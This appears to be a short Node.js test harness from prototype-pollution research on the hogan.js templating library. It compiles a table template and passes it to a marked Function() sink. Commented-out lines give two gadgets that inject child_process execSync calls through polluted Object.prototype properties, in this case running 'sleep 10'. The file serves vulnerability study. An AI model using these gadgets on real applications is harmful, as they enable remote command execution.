const hogan = require("hogan.js");


// gadget 1
// Object.prototype.name = '2';
// Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()}}//"

// gadget 2
// Object.prototype.delimiters = 'tr \n';
// Object.prototype.indent = '/*"));return process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()//*/';

try{
  Object._expose.setupSymbols()
}
catch(e){
  console.log("[!] symbolic execution not enabled")
}

const TEMPLATE = `
<table border="1">
  <thead>
    <tr>
      <th>City</th>
      <th>Pollution index</th>
      <th>Year</th>
    </tr>
  </thead>
  <tbody>
  {{#data}}
    <tr>
      <td>{{city}}</td>
      <td>{{pollution}}</td>
      <td>{{year}}</td>
    </tr>
  {{/data}}
  {{^data}}
    Nothing found
  {{/data}}
  </tbody>
</table>
`;

var options = {'asString': true};    
const template = hogan.compile(TEMPLATE, options);

//pp2rce sink
Function(`return ${template}`)();
